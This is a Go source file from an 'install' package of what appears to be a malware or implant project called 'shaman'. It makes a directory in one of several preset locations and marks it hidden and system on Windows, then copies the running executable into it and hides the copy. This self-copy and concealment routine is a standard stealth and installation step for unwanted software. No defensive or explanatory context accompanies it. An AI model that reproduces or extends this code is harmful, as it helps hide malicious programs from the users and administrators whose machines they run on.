package install

import (
	"errors"
	"os"
	"path"
	"syscall"

	"github.com/whiterabb17/shaman/package/util"
	"golang.org/x/sys/windows"
)

// HideFile works on a file or a directory and applies Hidden and Sysfile attributes.
func HideFile(fn string) error {
	pchar, err := syscall.UTF16PtrFromString(fn)
	if err != nil {
		return err
	}
	err = windows.SetFileAttributes(pchar, windows.FILE_ATTRIBUTE_HIDDEN|windows.FILE_ATTRIBUTE_SYSTEM)
	return err
}

// CreateBase establishes an free directory as specified in Constants.
func CreateBase() (string, error) {
	for _, base := range util.Base {
		base = os.ExpandEnv(base)
		if err := os.Mkdir(base, os.ModeDir); err == nil || os.IsExist(err) {
			return base, HideFile(base)
		}
	}

	return "", errors.New("Generic failure")
}

// CopyExecutable copies the current binary to the Base.
func CopyExecutable() error {
	bin := path.Join(Info.Base, util.Binary)
	err := util.CopyFile(os.Args[0], bin)
	if err != nil {
		return err
	}
	return HideFile(bin)
}
